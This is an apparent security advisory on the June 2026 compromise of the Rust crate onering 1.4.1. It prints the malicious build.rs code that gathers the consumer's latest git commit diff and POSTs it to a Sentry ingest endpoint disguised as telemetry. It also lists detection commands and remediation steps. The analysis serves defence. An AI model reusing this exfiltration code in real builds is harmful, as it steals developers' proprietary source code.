# onering Rust Crate Compromise — build.rs Injects Source Code Exfiltration via Sentry Disguise

**Date:** June 2026
**Ecosystem:** Rust / crates.io
**Severity:** High
**Type:** Maintainer Compromise / Build-Time Code Exfiltration / Source Code Theft
**Sources:**
- [Aikido — Compromised Rust crate onering performs code exfiltration](https://www.aikido.dev/blog/compromised-rust-crate-onering-performs-code-exfiltration)

---

## Summary

On June 10, 2026, Aikido Security detected malicious behavior in version 1.4.1 of the Rust crate `onering` — a high-throughput synchronous queue and channels library with over 18,000 downloads on crates.io. The maintainer's GitHub account (and the upstream repository) appears to have been compromised, and the attacker injected a malicious `build.rs` into the package that silently exfiltrates the diff of the consumer project's most recent git commit on every build.

Unlike the wave of npm and PyPI attacks focused on credential theft, this attack targets **source code** specifically. Every time a developer builds a project that depends on `onering@1.4.1`, the malicious `build.rs` runs automatically (as Cargo build scripts always do), extracts the git diff of their latest commit, and POSTs it disguised as a Sentry telemetry event — making the traffic appear as ordinary crash reporting.

Because the malicious code runs at build time — not install time — even developers who downloaded the crate before the compromise will trigger exfiltration the next time they run `cargo build`. And because the upstream GitHub repository was also compromised, pulling the crate from git rather than the registry is equally unsafe.

---

## Compromised Artifacts

| Artifact | Version / Ref | Notes |
|----------|--------------|-------|
| `onering` (crates.io) | 1.4.1 | Malicious `build.rs` injected |
| `cenotelie/onering` (GitHub) | HEAD at time of compromise | Repository also compromised — git source not safe |

---

## How It Worked

### Entry Point: Maintainer/Repository Compromise

The attacker gained access to the `onering` maintainer account (exact method not disclosed) and pushed a malicious `build.rs` to both the crates.io release (v1.4.1) and the upstream GitHub repository. This ensures the attack fires regardless of whether a developer installs from the registry or from source.

### Stage 1: Locating the Consumer Project

`build.rs` scripts in Rust run in the crate's own build directory, not the consumer project root. The malicious script walks up from `OUT_DIR` to find the actual consumer repository:

```rust
fn get_project_path() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let dir = PathBuf::from(std::env::var("OUT_DIR")?);
    let mut project_dir = &*dir;
    while let Some(parent) = project_dir.parent() {
        if let Some(last) = parent.iter().last()
            && last == "target"
            && let Some(parent) = parent.parent()
        {
            project_dir = parent;
            break;
        }
        project_dir = parent;
    }
    Ok(project_dir.to_path_buf())
}
```

### Stage 2: Extracting the Latest Commit Diff

Two `git` commands are run against the consumer's repository root:

```rust
// Captures commit metadata
let commit = git(&project_path, &["log", "-n", "1",
    r#"--pretty=format:{"commit":"%H","author":"%an","email":"%ae","date":"%aI","subject":"%s"}"#
])?;

// Captures full textual diff of the most recent commit
let patch = git(&project_path, &["diff", "HEAD^", "HEAD"])?;
```

The `git diff HEAD^ HEAD` call is particularly damaging because it runs on every build — over many builds, the attacker receives a rolling stream of source code changes rather than a single snapshot.

### Stage 3: Exfiltration Disguised as Sentry Telemetry

The stolen data is POSTed to a Sentry ingest endpoint, disguising the traffic as routine crash reporting:

```rust
let payload = format!(
    r#"{{"event_id":"{}","dsn":"https://8197ee42c4f59c83f4cc6d48f5bae821@o4511539639222272.ingest.de.sentry.io/4511539669368912"}}
{{"type":"event"}}
{{"message":"on build","level":"info","platform":"rust","tags": {commit},"extra": {{"patch":"{}"}}}}"#,
    Uuid::new_v4().as_simple(),
    patch.replace('"', "\\\"").replace('\n', "\\n"),
);

// POST to Sentry ingest endpoint — looks like crash reporting traffic
request("POST", "https://o4511539639222272.ingest.de.sentry.io/api/4511539669368912/envelope/", ...);
```

The choice of Sentry as a disguise is deliberate: Sentry traffic is extremely common in development environments, whitelisted in most network egress rules, and would not raise alerts in any monitoring system that doesn't inspect payload content.

---

## Timeline

| Date (UTC) | Event |
|-----------|-------|
| Unknown | Attacker compromises `onering` maintainer account and GitHub repository |
| Jun 10, 2026 | `onering@1.4.1` published to crates.io with malicious `build.rs` |
| Jun 10, 2026 | Aikido Security detects the malicious version and discloses publicly |
| Jun 10, 2026 | Aikido files GitHub issue: https://github.com/cenotelie/onering/issues/1 |
| Jun 10, 2026 | `onering@1.4.1` removed from crates.io; repository investigated |

---

## Detection

```bash
# Check if onering@1.4.1 is in your Cargo.lock
grep -A3 'name = "onering"' Cargo.lock

# Inspect the build.rs in the cached crate (if installed)
find ~/.cargo/registry -path "*/onering-1.4.1/build.rs" -exec cat {} \;

# Search for the malicious Sentry DSN in your cargo registry cache
grep -r "8197ee42c4f59c83f4cc6d48f5bae821" ~/.cargo/registry/ 2>/dev/null
grep -r "o4511539639222272" ~/.cargo/registry/ 2>/dev/null

# Check for outbound connections to Sentry ingest during builds
# (Capture network traffic during cargo build)
sudo tcpdump -i any host "ingest.de.sentry.io" &
cargo build 2>&1
# If traffic is seen, you are affected

# Search cargo build logs for unexpected git commands run during build
cargo build -v 2>&1 | grep "git\|sentry\|ingest"

# Check if build.rs in any dependency performs network calls
# (Broad scan for curl/reqwest/ureq in build scripts)
find ~/.cargo/registry -name "build.rs" | xargs grep -l "request\|reqwest\|curl\|ureq\|POST" 2>/dev/null
```

---

## Remediation

1. Upgrade `onering` to a clean version (v1.4.2+ if released by the verified maintainer, or remove the dependency entirely)
2. Add `onering = "=<1.4.0"` version pinning in `Cargo.toml` as a temporary measure if a clean release is not yet available
3. Assume any source code diff from projects that built against `onering@1.4.1` has been exfiltrated — assess the sensitivity of recently committed code
4. Audit your `Cargo.lock` for any other recently published crate versions from the same maintainer
5. If the crate was used in a CI environment, treat the build logs and any source diffs from that period as potentially exposed
6. Notify your security team if the exfiltrated code contained secrets, API keys, or other sensitive data embedded in source

---

## Lessons Learned

- **Cargo `build.rs` is a first-class attack surface**: Build scripts run automatically during `cargo build` with full access to the consumer's filesystem, environment, and network. They deserve the same scrutiny as postinstall hooks in npm/PyPI.
- **Exfiltrating *source code diffs* is a novel and ongoing threat**: Most supply chain attackers target credentials. This attack focuses on intellectual property — proprietary source code — which may be more valuable in certain contexts and harder to detect via credential rotation.
- **Sentry traffic is an effective exfiltration disguise**: Standard corporate network monitoring and egress rules commonly whitelist known observability endpoints. Attackers who disguise malicious traffic as legitimate telemetry can bypass DLP and network security controls.
- **Repository compromise doubles the blast radius**: When both the registry release and the upstream git source are compromised, pinning to a git commit hash is not safe — only verified release checksums from an uncompromised time provide safety.
- **Build-time vs install-time execution**: Unlike postinstall hooks that fire once at `npm install`, Cargo build scripts fire on every `cargo build` — meaning an already-cached compromised crate continues to exfiltrate data with each build until explicitly removed.

---

## Related Incidents

- [2026-05-trapdoor-npm-pypi-crates.md](./2026-05-trapdoor-npm-pypi-crates.md) — First significant Crates.io supply chain campaign; context for Rust ecosystem targeting
- [2026-04-elementary-data-pypi-ghcr.md](./2026-04-elementary-data-pypi-ghcr.md) — Similar build-time payload execution via `.pth` files in PyPI
- [2026-03-bittensor-pypi.md](./2026-03-bittensor-pypi.md) — Maintainer account compromise with malicious package injection pattern
